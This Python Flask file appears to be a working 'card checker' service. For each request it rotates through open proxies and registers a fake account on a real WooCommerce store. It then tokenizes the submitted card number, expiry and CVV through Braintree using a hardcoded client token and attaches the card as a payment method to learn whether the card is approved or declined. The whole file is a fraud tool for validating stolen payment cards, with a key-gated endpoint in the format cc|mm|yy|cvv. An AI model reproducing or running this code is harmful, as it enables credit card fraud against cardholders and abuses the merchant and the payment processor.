from flask import Flask, jsonify
import requests
import re
import json
import random
import string
from bs4 import BeautifulSoup

# --- Configuration ---
VALID_API_KEY = "diwazz"
BRAINTREE_CLIENT_TOKEN = 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NjE4NTA3MzUsImp0aSI6IjRjZjQwYTU0LTJjMjUtNDIwZC1hYzcyLWRhYzM1MzE5MmQ5NiIsInN1YiI6Ijg1Zmh2amhocTZqMnhoazgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijg1Zmh2amhocTZqMnhoazgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnt9fQ.AqIvVz1rquy1ZSvRXpCOM8mRCR1d9a7AuTdCUmIcy5TCn5O5qvoejohYrxqMVud0kuPaxCnKhWaMg5gO4UBCuw'

# --- PROXY CONFIGURATION ---
# Aapki di gayi poori proxy list
PROXY_LIST = [
    "http://54.221.235.245:3128", "http://209.97.150.167:3128", "http://159.203.61.169:8080", "http://190.242.157.215:8080",
    "http://45.186.6.104:3128", "http://198.199.86.11:3128", "http://200.26.232.82:3128", "http://159.203.61.169:80",
    "http://67.43.236.21:4749", "http://201.174.239.25:8080", "http://134.209.29.120:3128", "http://204.109.59.194:3121",
    "http://134.209.29.120:80", "http://207.180.228.55:80", "http://200.85.167.254:8080", "http://204.157.251.178:999",
    "http://91.121.106.55:8118", "http://8.243.68.10:8080", "http://134.209.29.120:8080", "http://82.18.249.208:8118",
    "http://209.97.150.167:80", "http://129.146.167.15:3128", "http://159.203.61.169:3128", "http://67.43.236.20:1745",
    "http://35.73.28.87:3128", "http://138.68.60.8:8080", "http://72.10.160.171:18653", "http://52.74.26.202:8080",
    "http://38.180.2.107:3128", "http://147.75.66.234:9443", "http://77.123.145.21:3128", "http://164.163.42.12:10000",
    "http://139.162.78.109:80", "http://164.163.42.31:10000", "http://164.163.42.28:10000", "http://185.233.203.191:4555",
    "http://164.163.42.7:10000", "http://164.163.42.20:10000", "http://164.163.42.26:10000", "http://164.163.42.10:10000",
    "http://187.49.176.141:8080", "http://164.163.40.1:10000", "http://164.163.42.4:10000", "http://172.104.63.237:3128",
    "http://145.40.90.214:10018", "http://65.108.203.35:28080", "http://43.229.79.217:3129", "http://164.163.40.90:10000",
    "http://164.163.42.34:10000", "http://18.188.141.177:8834", "http://72.10.160.174:28731", "http://164.163.42.39:10000",
    "http://179.96.28.58:80", "http://157.175.84.251:1080", "http://157.180.121.252:50517", "http://72.10.160.170:31141",
    "http://18.188.141.177:3128", "http://176.108.246.18:10804", "http://161.35.70.249:80", "http://42.180.0.58:6182",
    "http://187.102.219.64:999", "http://164.163.42.22:10000", "http://164.163.42.27:10000", "http://164.163.42.11:10000",
    # ... (aur aapki baaki saari proxies)
]


# --- Flask App Initialization ---
app = Flask(__name__)

# --- Helper Functions ---
def get_bin_details(bin_number):
    try:
        card_bin = bin_number[:8]
        headers = {'Accept-Version': '3'}
        response = requests.get(f"https://lookup.binlist.net/{card_bin}", headers=headers, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {"scheme": data.get("scheme", "N/A"), "type": data.get("type", "N/A"), "brand": data.get("brand", "N/A"), "country": data.get("country", {}).get("name", "N/A"), "bank": data.get("bank", {}).get("name", "N/A")}
        return {"error": f"BIN not found (Status: {response.status_code})"}
    except requests.exceptions.RequestException:
        return {"error": "Failed to fetch BIN details"}

def generate_random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# --- Main Checker Logic with Clean Error Handling ---
def run_braintree_check(card_details):
    bin_info = {}
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'})
    
    proxy_url = random.choice(PROXY_LIST)
    session.proxies = {"http": proxy_url, "https": proxy_url}

    try:
        cc, mm, yy, cvv = card_details.split('|')
        bin_info = get_bin_details(cc)

        # === Part 1: Register on Altairtech ===
        try:
            register_url = 'https://altairtech.io/account/lost-password/#login'
            reg_page_res = session.get(register_url, timeout=15)
            soup = BeautifulSoup(reg_page_res.text, 'html.parser')
            reg_nonce_tag = soup.find('input', {'name': 'woocommerce-register-nonce'})
            
            if not reg_nonce_tag:
                # Agar nonce nahi mila, toh yeh Proxy Error hai
                raise requests.exceptions.ProxyError("Registration nonce not found")

            reg_nonce = reg_nonce_tag.get('value')
            email = f"{generate_random_string()}@gmail.com"
            register_payload = {'email': email, 'woocommerce-register-nonce': reg_nonce, '_wp_http_referer': '/account/lost-password/', 'register': 'Register'}
            
            register_res = session.post(register_url, data=register_payload, timeout=15)
            if "My account" not in register_res.text and "Log out" not in register_res.text:
                raise requests.exceptions.ProxyError("Registration failed after submitting form")
        except requests.exceptions.ProxyError as e:
            return {"status": "error", "message": "Proxy Error", "bin_details": bin_info, "response": "Proxy Error"}
        except requests.exceptions.RequestException:
            # Koi bhi doosra connection error
            return {"status": "error", "message": "Proxy Error", "bin_details": bin_info, "response": "Proxy Error"}

        # === Part 2: Get Payment Page Nonce ===
        payment_page_url = 'https://altairtech.io/account/add-payment-method/'
        payment_page_res = session.get(payment_page_url, timeout=15)
        soup = BeautifulSoup(payment_page_res.text, 'html.parser')
        woocommerce_nonce_tag = soup.find('input', {'name': 'woocommerce-add-payment-method-nonce'})
        if not woocommerce_nonce_tag:
             return {"status": "error", "message": "Server Error", "bin_details": bin_info, "response": "Server Error (Payment Nonce)"}
        woocommerce_nonce = woocommerce_nonce_tag.get('value')

        # === Part 3: Generate Braintree Nonce ===
        graphql_headers = {'accept': '*/*', 'authorization': BRAINTREE_CLIENT_TOKEN, 'braintree-version': '2018-05-10', 'content-type': 'application/json', 'origin': 'https://assets.braintreegateway.com'}
        graphql_payload = {'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': 'c620b769-a8f3-4fde-9604-cc98c4e959f7'}, 'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }', 'variables': {'input': {'creditCard': {'number': cc, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvv}, 'options': {'validate': False}}}, 'operationName': 'TokenizeCreditCard'}
        
        response_graphql = requests.post('https://payments.braintree-api.com/graphql', headers=graphql_headers, json=graphql_payload, timeout=10)
        response_graphql.raise_for_status()
        braintree_data = response_graphql.json()
        
        if 'errors' in braintree_data:
            return {"status": "declined", "message": braintree_data['errors'][0]['message'], "bin_details": bin_info, "response": "Declined"}
        
        payment_nonce = braintree_data['data']['tokenizeCreditCard']['token']

        # === Part 4: Submit to Altairtech ===
        altair_data = {'payment_method': 'braintree_credit_card', 'wc_braintree_credit_card_payment_nonce': payment_nonce, 'wc_braintree_device_data': '{"correlation_id":"ce230cbd851503d4f63f8a47ebc9eb46"}', 'woocommerce-add-payment-method-nonce': woocommerce_nonce, '_wp_http_referer': '/account/add-payment-method/', 'woocommerce_add_payment_method': '1'}
        response_altair = session.post(payment_page_url, data=altair_data, timeout=15)
        
        match = re.search(r'Status code\s*([^<]+)\s*</li>', response_altair.text)
        if match:
            status_message = match.group(1).strip()
            if "approved" in status_message.lower(): # Agar kabhi approved aaye
                 return {"status": "approved", "message": status_message, "bin_details": bin_info, "response": "Approved"}
            else: # Baaki sab declined
                return {"status": "declined", "message": status_message, "bin_details": bin_info, "response": "Declined"}
        else:
            return {"status": "error", "message": "Server Error", "bin_details": bin_info, "response": "Server Error (Final Parse)"}

    except Exception:
        # Catch-all for any other unexpected error
        return {"status": "error", "message": "API Error", "bin_details": bin_info, "response": "API Error"}

# --- API Route ---
@app.route('/gate/b3/key=<api_key>/<card_details>')
def process_payment(api_key, card_details):
    if api_key != VALID_API_KEY:
        return jsonify({"status": "error", "message": "Invalid API Key", "response": "API Error"}), 401
    if card_details.count('|') != 3:
        return jsonify({"status": "error", "message": "Invalid card format. Use cc|mm|yy|cvv", "response": "API Error"}), 400
    
    result = run_braintree_check(card_details)
    return jsonify(result)

# --- Health Check Route ---
@app.route('/')
def index():
    return "Braintree Checker API (v3 - Clean Errors) is running!"
